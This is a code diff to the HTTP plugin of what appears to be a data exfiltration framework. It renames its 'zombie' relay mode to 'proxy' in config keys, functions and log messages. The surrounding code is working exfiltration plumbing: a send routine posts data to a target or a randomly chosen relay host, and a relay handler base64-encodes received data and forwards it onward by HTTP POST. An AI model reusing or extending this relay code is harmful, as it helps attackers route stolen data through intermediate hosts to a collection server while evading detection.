@@ -36,8 +36,8 @@ class S(BaseHTTPRequestHandler):
             pass
 
 def send(data):
-    if config.has_key('zombies') and config['zombies'] != [""]:
-        targets = [config['target']] + config['zombies']
+    if config.has_key('proxies') and config['proxies'] != [""]:
+        targets = [config['target']] + config['proxies']
     	target = "http://{}:{}".format(choice(targets), config['port'])
     else:
     	target = "http://{}:{}".format(config['target'], config['port'])
@@ -49,7 +49,7 @@ def send(data):
 def relay_http_request(data):
     target = "http://{}:{}".format(config['target'], config['port'])
     app_exfiltrate.log_message(
-        'info', "[zombie] [http] Relaying {0} bytes to {1}".format(len(data), target))
+        'info', "[proxy] [http] Relaying {0} bytes to {1}".format(len(data), target))
     data_to_send = {'data': base64.b64encode(data)}
     requests.post(target, data=data_to_send)
 
@@ -67,8 +67,8 @@ def listen():
     app_exfiltrate.log_message('info', "[http] Starting httpd...")
     server(app_exfiltrate.retrieve_data)
 
-def zombie():
-    app_exfiltrate.log_message('info', "[zombie] [http] Starting httpd...")
+def proxy():
+    app_exfiltrate.log_message('info', "[proxy] [http] Starting httpd...")
     server(relay_http_request)
 
 class Plugin:
@@ -76,4 +76,4 @@ class Plugin:
         global app_exfiltrate, config
         config = conf
         app_exfiltrate = app
-        app.register_plugin('http', {'send': send, 'listen': listen, 'zombie': zombie})
+        app.register_plugin('http', {'send': send, 'listen': listen, 'proxy': proxy})
